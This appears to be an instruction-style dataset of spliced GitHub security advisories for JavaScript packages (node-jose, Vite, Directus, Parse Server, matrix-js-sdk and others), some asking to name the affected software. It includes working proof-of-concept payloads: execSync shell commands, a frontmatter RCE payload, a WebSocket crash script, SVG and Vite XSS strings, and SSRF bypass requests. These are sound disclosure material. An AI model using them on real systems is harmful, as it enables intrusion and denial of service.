`staticFiles` is set under `serve` in the configuration file. you have two options to fix vulnerability;\n\n- Update `@graphql-mesh/cli` to a version higher than `0.82.21`, and if you use `@graphql-mesh/http`, update it to a version higher than `0.3.18`\n- Remove `staticFiles` option from the configuration, and use other solutions to serve static files.\n\n### Credits\nThanks [alanwillms@gmail.com](mailto:alanwillms@gmail.com) for reporting this vulnerability with details.

Please identify the software name affected by it. Input: ### Description\n\nWhen using the non-default \"fallback\" crypto back-end, ECC operations in `node-jose` can trigger a Denial-of-Service (DoS) condition, due to a possible infinite loop in an internal calculation.  For some ECC operations, this condition is triggered randomly; for others, it can be triggered by malicious input.\n\n#### Technical summary\n\nThe JOSE logic implemented by `node-jose` usually relies on an external cryptographic library for the underlying cryptographic primitives that JOSE operations require.  When WebCrypto or the Node `crypto` module are available, they are used.  When neither of these libraries is available, `node-jose` includes its own \"fallback\" implementations of some algorithms based on `node-forge`, in particular implementations of ECDH and ECDSA. \n\nA various points, these algorithm implementations need to compute to the X coordinate of an elliptic curve point.  This is done by calling the `getX()` method of the object representing the point, which is an alias of the function `pointFpGetX()` in `lib/deps/ecc/math.js`.\n\nComputing the X coordinate from the form in which the point is stored requires computing the modular inverse of the Z coordinate, using the `modInverse` function from the `jsbn` library (e.g., `this.z.modInverse(this.curve.p)`).  The output of this function call is multiplied by another value before being reduced with the `barrettReduce()` function.\n\nThe root cause of this issue is that the `jsbn` `modInverse` function sometimes returns negative results.  These results are correct in that they are equivalent mod the relevant modulus, but can be problematic for functions that expect modular operations to always return positive results (in the range `[0, p)`, where `p` is the modulus).\n\nIn particular, while the Barrett reduction algorithm in general can handle negative inputs, the implementation in `node-jose` explicitly does not. Therefore, while the negative value that is returned by `modInverse()` is mathematically correct, it leads to an error in `barrettReduce()` causing an infinite loop which may result in a Denial of Service condition.\n\nFor a given prime modulus, we estimate that roughly one in every `2^20` inputs produce a negative `modInverse()`.  This estimate was validated with exhaustive testing on small primes (<30 bits) and randomized testing with regard to the P-256 prime.\n\n### Impact\n\nThis issue is only present in situations where the \"fallback\" cryptographic implementation is being used, i.e., situations where neither WebCrypto nor the Node `crypto` module is available.\n\nThe following elliptic curve algorithms are impacted by this issue (all in `lib/deps/ecc/index.js`):\n\n- Elliptic curve key generation (`exports.generateKeyPair`)\n- Converting an elliptic curve private key to a public key (`ECPrivateKey.prototype.toPublicKey`)\n- ECDSA signing (`ECPrivateKey.prototype.sign`)\n- ECDSA verification (`ECPublicKey.prototype.verify`)\n- ECDH key agreement (`ECPrivateKey.prototype.computeSecret`)\n\nIn the first three cases, the points being evaluated are generated randomly, so an attack could only arise due to a bad value being randomly selected (as noted above, with probability roughly `2^{-20}`).  In the latter two cases, the points being evaluated are provided from outside the library, and thus potentially by attackers.\n\n### Patches\n\n_Has the problem been patched? What versions should users upgrade to?_\n\n### Workarounds\n\nSince this issue is only present in the \"fallback\" crypto implementation, it can be avoided by ensuring that either WebCrypto or the Node `crypto` module is available in the JS environment where `node-jose` is being run.\n\n### References\n\n- [Barrett reduction on Wikipedia](https://en.wikipedia.org/wiki/Barrett_reduction)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [cisco/node-jose](https://github.com/cisco/node-jose/issues)\n* Email [Cisco open source security](mailto:oss-security@cisco.com)\n\n### Credits\n\n- Research and disclosure: BlackBerry\n- Fix implementation: [Richard Barnes (@bifurcation)](https://github.com/bifurcation)\n- Release engineering: [Stephen Augustus (@justaugustus)](https://github.com/justaugustus)\n.

Logs the result of shell command \"dir\" to the console.\nconsole.log(require('child_process').execSync('dir').toString())\n\n// Synchrony exploit PoC\n{\n  var __proto__ = { parser: 'poc.js' }\n}\n```\n\nThen, run `synchrony poc.js` from the same directory as the malicious file.\n\n### Credits\n\nThis vulnerability was found and disclosed by [William Khem-Marquez][SteakEnthusiast].\n\n[LiteralMap]: src/transformers/literalmap.ts\n[SteakEnthusiast]: https://github.com/SteakEnthusiast\n[disable-proto]: https://nodejs.dev/en/api/v20/cli/#--disable-protomode\n[prettier/src/main/parser.js]: https://github.com/prettier/prettier/blob/2.5.1/src/main/parser.js#L53-L63\n.

This code has been the same since crypto-js was first created.\n\n#### Further Cryptanalysis\n\nThe issue here is especially egregious because the length extension attack makes useless any secret that might be appended to the plaintext before calculating its signature.\n\nConsider a scheme in which a secret is created for a user's username, and that secret is used to protect e.g. their passwords. Let's say that password is 'fake-password', and their username is 'example-username'.\n\nTo encrypt the user password via symmetric encryption we might do `encrypt(plaintext: 'fake-password', encryption_key: cryptojs.pbkdf2(value: 'example username' + salt_or_pepper))`. By this means, we would, in theory, create an `encryption_key` that can be determined from the public username, but which requires the secret `salt_or_pepper` to generate. This is a common scheme for protecting passwords, as exemplified in bcrypt & scrypt. Because the encryption key is symmetric, we can use this derived key to also decrypt the ciphertext.\n\nBecause of the length extension issue, if the attacker obtains (via attack 1), a collision with 'example username', the attacker _does not need to know_ `salt_or_pepper` to decrypt their account data, only their public username.\n\n### Description\n\nPBKDF2 is a key-derivation function that is used for two main purposes: (1) to stretch or squash a variable length password's entropy into a fixed size for consumption by another cryptographic operation and (2) to reduce the chance of downstream operations recovering the password input (for example, for password storage).\n\nUnlike the modern [webcrypto](https://w3c.github.io/webcrypto/#pbkdf2-operations) standard, crypto-js does not throw an error when a number of iterations is not specified, and defaults to one single iteration. In the year 1993, when PBKDF2 was originally specified, the minimum number of iterations suggested was set at 1,000.

Input: ### Summary\nIt seems that any Directus installation that has websockets enabled can be crashed if the websocket server receives an invalid frame. This could probably be posted as an issue and I might even be able to put together a pull request for a fix (if only I had some extra time...), but I decided to instead post as a vulnerability just for the maintainers, since this seemingly can be used to crash any live Directus server if websockets are enabled, so public disclosure is not a good idea until the issue is fixed.\n\n### Details\nThe fix for this seems quite simple; the websocket server just needs to properly catch the error instead of crashing the server. See for example: https://github.com/websockets/ws/issues/2098\n\n### PoC\n- Start a fresh Directus server (using for example the compose file here: https://docs.directus.io/self-hosted/docker-guide.html). Enable websockets by setting `WEBSOCKETS_ENABLED: 'true'` environment variable.\n- run a separate node app somewhere else to send an invalid frame to the server:\n\n```\nconst WebSocket = require(\"ws\");\nconst websocket = new WebSocket(\"ws://0.0.0.0:8055/websocket\");\nwebsocket.on(\"open\", function () {\n  const chunk = Buffer.from(\"a180\", \"hex\");\n  websocket._socket.write(chunk);\n});\n```\n\n### Impact\nThe server crashes with an error: `RangeError: Invalid WebSocket frame: RSV2 and RSV3 must be clear`. Server needs to be manually restarted to get back online (if there's no recovery mechanism in place, as there often isn't with simple node servers). This was confirmed on a local server, and additionally I was able to crash our staging server with the same code, just pointing to our staging Directus server running at fly.io. It seems to also crash servers running in the [directus.cloud](https://directus.cloud) service. I created https://websocket-test.directus.app/, pointed the above script to the websocket url of that instance and the server does crash for a while. It seems that in there there's a mechanism for bringing the server back up quite fast, but it would be quite trivial for anyone to DoS any server running in directus.cloud by just spamming these invalid frames to the server. .

Input: ### Summary\nAn upper bound check issue in `dsaVerify` function allows an attacker to construct signatures that can be successfully verified by any public key, thus leading to a signature forgery attack.\n\n### Details\nIn `dsaVerify` function, it checks whether the value of the signature is legal by calling function `checkValue`, namely, whether `r` and `s` are both in the interval `[1, q - 1]`. However, the second line of the `checkValue` function wrongly checks the upper bound of the passed parameters, since the value of `b.cmp(q)` can only be `0`, `1` and `-1`, and it can never be greater than `q`. \n\nIn this way, although the values of `s` cannot be `0`, an attacker can achieve the same effect as zero by setting its value to `q`, and then send `(r, s) = (1, q)` to pass the verification of any public key.\n\n### Impact\nAll places in this project that involve DSA verification of user-input signatures will be affected by this vulnerability.\n\n\n### Fix PR:\nSince the temporary private fork was deleted, here's a webarchive of the PR discussion and diff pages: [PR webarchive.zip](https://github.com/browserify/browserify-sign/files/13172957/PR.webarchive.zip)\n.

Input: ### Impact\nThe gatsby-transformer-remark plugin prior to versions 5.25.1 and 6.3.2 passes input through to the `gray-matter` npm package, which is vulnerable to JavaScript injection in its default configuration, unless input is sanitized.  The vulnerability is present in gatsby-transformer-remark when passing input in data mode (querying MarkdownRemark nodes via GraphQL).  Injected JavaScript executes in the context of the build server.\n\nTo exploit this vulnerability untrusted/unsanitized input would need to be sourced by or added into a file processed by gatsby-transformer-remark.  The following payload demonstrates a vulnerable configuration:\n```\n---js\n((require(\"child_process\")).execSync(\"id >> /tmp/rce\"))\n--- \n```\n\n### Patches\nA patch has been introduced in `gatsby-transformer-remark@5.25.1` and `gatsby-transformer-remark@6.3.2` which mitigates the issue by disabling the `gray-matter` JavaScript Frontmatter engine.  The patch introduces a new option, `JSFrontmatterEngine` which is set to `false` by default.  When setting `JSFrontmatterEngine` to `true`, input passed to `gatsby-plugin-mdx` must be sanitized before processing to avoid a security risk.  Warnings are displayed when enabling `JSFrontmatterEngine` to `true` or if it appears that the MarkdownRemark input is attempting to use the Frontmatter engine.\n\n### Workarounds\nIf an older version of `gatsby-transformer-remark` must be used, input passed into the plugin should be sanitized ahead of processing.\n\n**We encourage projects to upgrade to the latest major release branch for all Gatsby plugins to ensure the latest security updates and bug fixes are received in a timely manner.**\n\n\n### For more information\nEmail us at [security@gatsbyjs.com](mailto:security@gatsbyjs.com)..

This vulnerability allows an attacker to send arbitrary HTTP requests from the server to other servers or resources on the network.\n\n## Description\n\nAn attacker can exploit this vulnerability by sending a request to the affected routes with a malicious URL. For example, if an attacker controls the `ATTACKER.HOST` domain, they can send a request to affected routes with the value set to `ATTACKER.HOST%2F%23`.\nThe `%2F` and `%23` characters are URL-encoded versions of the forward-slash (`/`) and pound (`#`) characters, respectively. In this context, an attacker could use those characters to append the base URL (i.e. `https://${input}.defined.host`) to be modified to `https://ATTACKER.HOST/#.defined.host`. This will cause the server to send a request to the attacker-controlled domain, allowing the attacker to potentially gain access to sensitive information or perform further attacks on the server. \n\n## Impact\n\nAn attacker could use this vulnerability to send requests to internal or any other servers or resources on the network, potentially gain access to sensitive information that would not normally be accessible and amplifying the impact of the attack.\n\n## Reference\n\nFixing PR: https://github.com/DIYgod/RSSHub/pull/11588.

In doing so, literal `<script>`-tags and on-event handlers were detected:\n```typescript\n[...]\n  const svgEl = div.firstElementChild!\n  const attributes = Array.from(svgEl.attributes).map(({ name }) => name)\n  const hasScriptAttr = !!attributes.find((attr) => attr.startsWith('on'))\n  const scripts = svgEl.getElementsByTagName('script')\n  return scripts.length === 0 && !hasScriptAttr ? svg : null\n[...]\n```\n\nThere are more ways to embed JavaScript in XML files.\n\n**Anchor Tag** (requires user to click link):\n```xml\n<svg viewBox=\"0 0 100 100\" xmlns=\"http://www.w3.org/2000/svg\">\n  <a href=\"javascript:alert(document.domain)\">\n    <text x=\"50\" y=\"50\" text-anchor=\"middle\">Lauritz</text>\n  </a>\n</svg>\n```\n\n**Foreign Object Tag** (no user interaction required):\n```xml\n<svg width=\"500\" height=\"500\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n        <text x=\"20\" y=\"35\">Lauritz</text>\n        <foreignObject width=\"500\" height=\"500\">\n                <iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:confirm(document.domain);\" width=\"400\" height=\"250\"/>\n        </foreignObject>\n</svg>\n```\n\nAs a result, downstream software that relies on `sanitize-svg` and expects resulting SVGs to be safe, may be vulnerable to XSS.

If a FormData instance contained more than 2^31 elements, the `forEach()` method could end up reading from the wrong location in memory while iterating over elements. This would most likely lead to a segmentation fault, but could theoretically allow arbitrary undefined behavior.\n\nIn order for the bug to be exploitable, the process would need to be able to allocate 160GB of RAM. Due to this, the bug was never exploitable on the Cloudflare Workers platform, but could theoretically be exploitable on deployments of workerd running on machines with a huge amount of memory. Moreover, in order to be remotely exploited, an attacker would have to upload a single form-encoded HTTP request of at least tens of gigabytes in size. The application code would then have to use `request.formData()` to parse the request and `formData.forEach()` to iterate over this data. Due to these limitations, the exploitation likelihood was considered Low.\n\n### Patches\nA fix that addresses this vulnerability has been released in version v1.20230419.0 and users are encouraged to update to the latest version available.\n\n### References\nRelease - https://github.com/cloudflare/workerd/releases/tag/v1.20230419.0.

Please identify the software name affected by it. Input: ### Impact\n\nPhishing attack vulnerability by uploading malicious files. A malicious user could upload a HTML file to Parse Server via its public API. That HTML file would then be accessible at the internet domain at which Parse Server is hosted. The URL of the the uploaded HTML could be shared for phishing attacks. The HTML page may seem legitimate because it is served under the internet domain where Parse Server is hosted, which may be the same as a company's official website domain.\n\nAn additional security issue arises when the Parse JavaScript SDK is used. The SDK stores sessions in the internet browser's local storage, which usually restricts data access depending on the internet domain. A malicious HTML file could contain a script that retrieves the user's session token from local storage and then share it with the attacker.\n\n### Patches\n\nThe fix adds a new Parse Server option `fileUpload.fileExtensions` to restrict file upload on Parse Server by file extension. It is recommended to restrict file upload for HTML file extensions, which this fix disables by default. If an app requires upload of files with HTML file extensions, the option can be set to `['.*']` or another custom value to override the default.\n\n### References\n\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-9prm-jqwx-45x9\n- https://github.com/parse-community/parse-server/pull/8538 (Parse Server 6)\n- https://github.com/parse-community/parse-server/pull/8537 (Parse Server 5)\n.

Under certain conditions, this vulnerability allows an attacker to cause excessive computation times on the server, leading to denial of service (DoS).\n\nApplications that are using Sentry's Astro SDK are affected if:\n\n1. They're using Sentry instrumentation:\n   - they have [manually registered](https://docs.sentry.io/platforms/javascript/guides/astro/manual-setup/#manually-add-server-instrumentation) Sentry Middleware (affected versions 7.78.0-7.86.0);\n   - or [configured](https://docs.sentry.io/platforms/javascript/guides/astro/manual-setup/#configure-server-instrumentation) Astro in SSR (server) or hybrid mode, use Astro 3.5.0 and newer and didn\u2019t [disable the automatic server instrumentation](https://docs.sentry.io/platforms/javascript/guides/astro/manual-setup/#disable-auto-server-instrumentation) (affected versions 7.82.0-7.86.0).\n2. They have configured routes with at least two path params (e.g. `/foo/[p1]/bar/[p2]`).\n\n### Patches\nThe problem has been patched in [@sentry/astro@7.87.0](https://www.npmjs.com/package/@sentry/astro/v/7.87.0).\nThe corresponding PR: https://github.com/getsentry/sentry-javascript/pull/9815\n\n### Workarounds\nWe strongly recommend upgrading to the latest SDK version. However, if it's not possible, the steps to mitigate the vulnerability without upgrade are:\n* [disable auto instrumentation](https://docs.sentry.io/platforms/javascript/guides/astro/manual-setup/#disable-auto-server-instrumentation) if you're using Astro 3.5.0 or newer\n* and remove the manually added Sentry middleware (if it was [added](https://docs.sentry.io/platforms/javascript/guides/astro/manual-setup/#manually-add-server-instrumentation) before).\n\nAfter these changes, Sentry error reporting will still be functional, but some details such as server-side transactions (and consequently, distributed traces between client and server) will be omitted. We therefore still recommend to update to 7.87.0 as soon as you can. \n\n### References\n* [Sentry docs: Manual Setup for Astro](https://docs.sentry.io/platforms/javascript/guides/astro/manual-setup/)\n* [Release notes: sentry-javascript 7.87.0](https://github.com/getsentry/sentry-javascript/releases/tag/7.87.0)\n* [npm: @sentry/astro@7.87.0](https://www.npmjs.com/package/@sentry/astro/v/7.87.0).

We can abuse the retry logic to cause the server to crash from a stack overflow.\n\n### Details\n`fetchOptions` [are obtained directly from the request body](https://github.com/johannschopplich/nuxt-api-party/blob/777462e1e3af1d9f8938aa33f230cd8cb6e0cc9a/src/runtime/server/handler.ts#L27).

Input: ## Overview:\n\nA moderate security vulnerability has been identified in Uptime Kuma platform that poses a significant threat to the confidentiality and integrity of user accounts.  \nWhen a user changes their login password in Uptime Kuma, a previously logged-in user retains access without being logged out.\nThis behaviour persists consistently, even after system restarts or browser restarts.\nThis vulnerability allows unauthorized access to user accounts, compromising the security of sensitive information.\n\nThe same vulnerability was partially fixed in https://github.com/louislam/uptime-kuma/security/advisories/GHSA-g9v2-wqcj-j99g but logging existing users out of their accounts was forgotten.\n\n## Impact:\n\nThe impact of this vulnerability is moderate, as it enables attackers or unauthorized individuals to maintain access to user accounts even after the account password has been changed. This can lead to unauthorized data access, manipulation, or compromise of user accounts, posing a threat to the integrity and confidentiality of Uptime Kuma.\nA better impact-analysis is included in https://github.com/louislam/uptime-kuma/security/advisories/GHSA-g9v2-wqcj-j99g\n\n## PoC\n\n- Change the password for a user account\n- Access the platform using the previously logged-in account without logging out\n- Note that access (read-write) remains despite the password change \n- Expected behaviour:  \n   After changing the password for a user account, all previously logged-in sessions should be invalidated, requiring users to log in again with the updated credentials.\n- Actual behaviour:  \n  The system retains sessions and never logs out users unless explicitly done by clicking logout.\n\n## Remediation:\n\nTo mitigate the risks associated with this vulnerability, we made the server emit a `refresh` event (clients handle this by reloading) and then disconnecting all clients except the one initiating the password change.\n\nIt is recommended to Update Uptime Kuma to `>= 1.23.9`. \n\n## Timeline:\n\n|Date|Event|\n|--|--|\n|2023-12-07 14:35 UTC| @manoonabbasi discovered and posts this information as a `bug`-report in issue #4188 [^1] into our **public issue tracker**, which is [**against our security policy**](https://github.com/louislam/uptime-kuma/security/policy) |\n| 2023-12-07 16:50 UTC | The Uptime Kuma team deleted the post in our issue tracker |\n| 2023-12-10 18:10 UTC | Uptime Kuma team released patch and this Advisory |\n\n[^1]: deleted to prevent the spread of this vulnerability without there being a fix available.

[A previous vulnerability](https://huntr.dev/bounties/4c57a3f6-0d0e-4431-9494-4a1e7b062fbf/) allowed an attacker to change the baseURL of the request, potentially leading to credentials being leaked or SSRF. \n\nThis vulnerability is similar, and was caused by a recent change to the detection of absolute URLs, which is no longer sufficient to prevent SSRF. \n\n### Details\n`nuxt-api-party` attempts to check if the user has passed an absolute URL to prevent the aforementioned attack. This has been recently changed to [use a regular expression](https://github.com/johannschopplich/nuxt-api-party/blob/777462e1e3af1d9f8938aa33f230cd8cb6e0cc9a/src/runtime/server/handler.ts#L31) `^https?://`.\n\nThis regular expression can be bypassed by an absolute URL with leading whitespace. For example `\\nhttps://whatever.com` has a leading newline. \n\nAccording to the fetch specification, before a fetch is made the URL is normalized. \"To normalize a [byte sequence](https://infra.spec.whatwg.org/#byte-sequence) potentialValue, remove any leading and trailing [HTTP whitespace bytes](https://fetch.spec.whatwg.org/#http-whitespace-byte) from potentialValue.\" ([source](https://fetch.spec.whatwg.org/))\n\nThis means the final request will be normalized to `https://whatever.com`. We have bypassed the check and `nuxt-api-party` will send a request outside of the whitelist. \n\nThis could allow us to leak credentials or perform SSRF.\n\n### PoC\nPOC using Node.\n\n```js\nawait fetch(\"/api/__api_party/MyEndpoint\", {\n    method: \"POST\",\n    body: JSON.stringify({ path: \"\\nhttps://google.com\" }),\n    headers: { \"Content-Type\": \"application/json\" }\n})\n```\n\nWe can use `__proto__` as a substitute for the endpoint if it is not known. This will not leak any credentials as all attributes on `endpoint` will be undefined.\n```js\nawait fetch(\"/api/__api_party/__proto__\", {\n    method: \"POST\",\n    body: JSON.stringify({ path: \"\\nhttps://google.com\" }),\n    headers: { \"Content-Type\": \"application/json\" }\n})\n```\n\n### Impact\nLeak of sensitive API credentials. SSRF.\n\n\n### Fix\nRevert to the previous method of detecting absolute URLs.\n```js\n  if (new URL(path, 'http://localhost').origin !== 'http://localhost') {\n      // ...\n  }\n```\n.

Please identify the software name affected by it. Input: ### Summary\nWhen Vite's HTML transformation is invoked manually via `server.transformIndexHtml`, the original request URL is passed in unmodified, and the `html` being transformed contains inline module scripts (`<script type=\"module\">...</script>`), it is possible to inject arbitrary HTML into the transformed output by supplying a malicious URL query string to `server.transformIndexHtml`.\n\n### Impact\nOnly apps using `appType: 'custom'` and using the default Vite HTML middleware are affected. The HTML entry must also contain an inline script. The attack requires a user to click on a malicious URL while running the dev server. Restricted files aren't exposed to the attacker.\n\n### Patches\nFixed in vite@5.0.5, vite@4.5.1, vite@4.4.12\n\n### Details\nSuppose `index.html` contains an inline module script:\n\n```html\n<script type=\"module\">\n  // Inline script\n</script>\n```\n\nThis script is transformed into a proxy script like\n\n```html\n<script type=\"module\" src=\"/index.html?html-proxy&index=0.js\"></script>\n```\n\ndue to Vite's HTML plugin:\n\nhttps://github.com/vitejs/vite/blob/7fd7c6cebfcad34ae7021ebee28f97b1f28ef3f3/packages/vite/src/node/plugins/html.ts#L429-L465\n\nWhen `appType: 'spa' | 'mpa'`, Vite serves HTML itself, and `htmlFallbackMiddleware` rewrites `req.url` to the canonical path of `index.html`,\n\nhttps://github.com/vitejs/vite/blob/73ef074b80fa7252e0c46a37a2c94ba8cba46504/packages/vite/src/node/server/middlewares/htmlFallback.ts#L44-L47\n\nso the `url` passed to `server.transformIndexHtml` is `/index.html`.\n\nHowever, if `appType: 'custom'`, HTML is served manually, and if `server.transformIndexHtml` is called with the unmodified request URL (as the SSR docs suggest), then the path of the transformed `html-proxy` script varies with the request URL. For example, a request with path `/` produces\n\n```html\n<script type=\"module\" src=\"/@id/__x00__/index.html?html-proxy&index=0.js\"></script>\n```\n\nIt is possible to abuse this behavior by crafting a request URL to contain a malicious payload like\n\n```\n\"></script><script>alert('boom')</script>\n```\n\nso a request to http://localhost:5173/?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E produces HTML output like\n\n```html\n<script type=\"module\" src=\"/@id/__x00__/?\"></script><script>alert(\"boom\")</script>?html-proxy&index=0.js\"></script>\n```\n\nwhich demonstrates XSS.\n\n### PoC\n\n- Example 1. Serving HTML from `vite dev` middleware with `appType: 'custom'`\n    - Go to https://stackblitz.com/edit/vitejs-vite-9xhma4?file=main.js&terminal=dev-html\n    - \"Open in New Tab\"\n    - Edit URL to set query string to `?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E` and navigate\n    - Witness XSS:\n    - ![image](https://user-images.githubusercontent.com/2456381/287434281-13757894-7a63-4a73-b1e9-d2b024c19d14.png)\n- Example 2. Serving HTML from SSR-style Express server (Vite dev server runs in middleware mode):\n    - Go to https://stackblitz.com/edit/vitejs-vite-9xhma4?file=main.js&terminal=server\n    - (Same steps as above)\n- Example 3. Plain `vite dev` (this shows that vanilla `vite dev` is _not_ vulnerable, provided `htmlFallbackMiddleware` is used)\n    - Go to https://stackblitz.com/edit/vitejs-vite-9xhma4?file=main.js&terminal=dev\n    - (Same steps as above)\n    - You should _not_ see the alert box in this case\n\n### Detailed Impact\n\nThis will probably predominantly affect [development-mode SSR](https://vitejs.dev/guide/ssr#setting-up-the-dev-server), where `vite.transformHtml` is called using the original `req.url`, per the docs:\n\nhttps://github.com/vitejs/vite/blob/7fd7c6cebfcad34ae7021ebee28f97b1f28ef3f3/docs/guide/ssr.md?plain=1#L114-L126\n\nHowever, since this vulnerability affects `server.transformIndexHtml`, the scope of impact may be higher to also include other ad-hoc calls to `server.transformIndexHtml` from outside of Vite's own codebase.\n\nMy best guess at bisecting which versions are vulnerable involves the following test script\n\n```js\nimport fs from 'node:fs/promises';\nimport * as vite from 'vite';\n\nconst html = `\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\" />\n  </head>\n  <body>\n    <script type=\"module\">\n      // Inline script\n    </script>\n  </body>\n</html>\n`;\nconst server = await vite.createServer({ appType: 'custom' });\nconst transformed = await server.transformIndexHtml('/?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E', html);\nconsole.log(transformed);\nawait server.close();\n```\n\nand using it I was able to narrow down to #13581.

Input: ### Impact\n\nBy sending specially crafted headers an attacker can bypass the source image domain allowlist, causing the handler to load and return arbitrary images. Because the response is cached globally, this image will then be served to visitors without requiring those headers to be set. XSS can be achieved by requesting a malicious SVG with embedded scripts, which would then be served from the site domain. Note that this does not apply to images loaded in `<img>` tags, as scripts do not execute in this context. The image URL can be set in the header independently of the request URL, meaning any site images that have not previously been cached can have their cache poisoned.\n\n### Patches\nThis problem has been fixed in version 1.2.3\n\n### Workarounds\n\nThe problem is no longer exploitable on Netlify as the CDN now sanitizes the relevant header.

For example, a foreign user can assign the session object to their own user by writing to the `user` field and then read any custom fields of that session object.\n\nNote that assigning a session to a foreign user does not usually change the privileges of neither of the two users, according to how Parse Server uses session objects internally. However, if custom logic is used to relate specific session objects to privileges this vulnerability may have a higher level of severity.\n\nThe vulnerability does not allow a foreign user to assign a session object to themselves, read the session token, and then reassign the session object to the original user to then authenticate as that user with the known session token. The vulnerability only exists for foreign session objects, a user cannot assign their own session to another user.\n\nWhile it is unlikely that the session object ID of another user is known, it is possible to brute-force guess an object ID, even though the attacker would not know to which user a successfully guessed session object ID belongs.\n\n### Patches\n\nThe fix prevents writing to foreign session objects, even if the session object ID is known.\n\n### Workarounds\n\nAdd a `beforeSave` trigger to the `_Session` class and prevent writing if the requesting user is different from the user in the session object.\n\n### References\n\n- GitHub advisory [GHSA-6w4q-23cf-j9jp](https://github.com/parse-community/parse-server/security/advisories/GHSA-6w4q-23cf-j9jp).

Input: ### Impact\n\nValidation of the authentication adapter app ID for _Facebook_ and _Spotify_ may be circumvented.\n\nThis fixes a vulnerability that affects configurations which allow users to authenticate using the Parse Server authentication adapter for _Facebook_ or _Spotify_ and where the server-side authentication adapter configuration `appIds` is set as a string (e.g. `abc`) instead of an array of strings (e.g. `[\"abc\"]`). The vulnerability makes it possible to authenticate requests which are coming from a _Facebook_ or _Spotify_ app with a different app ID than the one specified in the `appIds` configuration.\n\nBoth adapters still validate the access token with the respective authentication provider. An app ID is automatically assigned by the authentication provider. For this vulnerability to be exploited, an attacker would have to be assigned an app ID by the authentication provider which is a sub-set of the server-side configured app ID.\n\nThe documentation did not explicitly specify that the parameter `appIds` must be set as an array of strings and setting a string also worked. Therefore, there is a possibility that there are deployments where `appIds` is set as a string, making them vulnerable.\n\n### Patches\n\nThe fix makes Parse Server check the type of the value set for `appIds` and throws an error if the value is not an array.\n\n### Workarounds\n\nNo known workarounds.\n\n### References\n\n- GitHub advisory [GHSA-r657-33vp-gp22](https://github.com/parse-community/parse-server/security/advisories/GHSA-r657-33vp-gp22).

Input: ### Impact\n\nAn attacker cooperating with a malicious homeserver can construct messages that legitimately appear to have come from another person, without any indication such as a grey shield.\n\nAdditionally, a sophisticated attacker cooperating with a malicious homeserver could employ this vulnerability to perform a targeted attack in order to send fake to-device messages appearing to originate from another user. This can allow, for example, to inject the key backup secret during a self-verification, to make a targeted device start using a malicious key backup spoofed by the homeserver.\n\nThese attacks are possible due to a protocol confusion vulnerability that accepts to-device messages encrypted with Megolm instead of Olm.\n\n### Patches\n\nmatrix-js-sdk has been modified to only accept Olm-encrypted to-device messages.\n\nOut of caution, several other checks have been audited or added:\n- Cleartext `m.room_key`, `m.forwarded_room_key` and `m.secret.send` to_device messages are discarded.\n- Secrets received from untrusted devices are discarded.\n- Key backups are only usable if they have a valid signature from a trusted device (no more local trust, or trust-on-decrypt).\n- The origin of a to-device message should only be determined by observing the Olm session which managed to decrypt the message, and not by using claimed sender_key, user_id, or any other fields controllable by the homeserver.\n\n### Workarounds\n\nAs this attack requires coordination between a malicious home server and an attacker, if you trust your home server no particular workaround is needed. Notice that the backup spoofing attack is a particularly sophisticated targeted attack.\n\nWe are not aware of this attack being used in the wild, though specifying a false positive-free way of noticing malicious key backups key is challenging.\n\nAs an abundance of caution, to avoid malicious backup attacks, you should not verify your new logins using emoji/QR verifications methods until patched. Prefer verifying with your security passphrase instead.\n\n### References\nBlog post: https://matrix.org/blog/2022/09/28/upgrade-now-to-address-encryption-vulns-in-matrix-sdks-and-clients\n\n### For more information\nIf you have any questions or comments about this advisory, e-mail us at [security@matrix.org](mailto:security@matrix.org).\n.

Such messages will be marked with a grey shield on some platforms, but this may be missing in others.\n\nThis attack is possible due to the matrix-js-sdk implementing a too permissive [key forwarding](https://spec.matrix.org/v1.3/client-server-api/#key-requests) strategy on the receiving end.\n\nKey forwarding is a mechanism allowing clients to recover from \u201cunable to decrypt\u201d messages when they missed the initial key distribution, at the time the message was originally sent. Examples include accessing message history before they joined the room but also when some network/federation errors have occurred.\n\n## Patches\n\nThe default policy for accepting key forwards has been made more strict in the matrix-js-sdk. matrix-js-sdk will now only accept forwarded keys in response to previously issued requests and only from own, verified devices.\n\nA unique exception to this rule is with the experimental [MSC3061](https://github.com/matrix-org/matrix-spec-proposals/pull/3061), that is forwarding room keys for past messages when invited in a room configured with the proper history visibility setting. Such key forwards are parked upon receipt and are only accepted if the SDK receives an invitation for that room from the inviter in a limited time window.\n\nThe SDK now sets a `trusted` flag on the decrypted message upon decryption, based on whether the key used to decrypt the message was received from a trusted source. Clients need to ensure that messages decrypted with a key with `trusted = false` are decorated appropriately (for example, by showing a warning for such messages).\n\n### Workarounds\n\nAs this attack requires coordination between a malicious homeserver and an attacker, if you trust your homeserver, no particular workaround is needed.\n\n## References\nBlog post: https://matrix.org/blog/2022/09/28/upgrade-now-to-address-encryption-vulns-in-matrix-sdks-and-clients\n\n## For more information\nIf you have any questions or comments about this advisory, e-mail us at security@matrix.org..

Input: The PBKDF2-based JWE key management algorithms expect a JOSE Header Parameter named `p2c` ([PBES2 Count](https://www.rfc-editor.org/rfc/rfc7518.html#section-4.8.1.2)), which determines how many PBKDF2 iterations must be executed in order to derive a CEK wrapping key. The purpose of this parameter is to intentionally slow down the key derivation function in order to make password brute-force and dictionary attacks more expensive.\n\nThis makes the PBES2 algorithms unsuitable for situations where the JWE is coming from an untrusted source: an adversary can intentionally pick an extremely high PBES2 Count value, that will initiate a CPU-bound computation that may take an unreasonable amount of time to finish.\n\n### Impact\n\nUnder certain conditions (see below) it is possible to have the user's environment consume unreasonable amount of CPU time.\n\n### Affected users\n\nThe impact is limited only to users utilizing the JWE decryption APIs with symmetric secrets to decrypt JWEs from untrusted parties who do not limit the accepted JWE Key Management Algorithms (`alg` Header Parameter) using the `keyManagementAlgorithms` (or `algorithms` in v1.x) decryption option or through other means.\n\nThe PBKDF2-based JWE Key Management Algorithm Identifiers are\n\n- `PBES2-HS256+A128KW`\n- `PBES2-HS384+A192KW`\n- 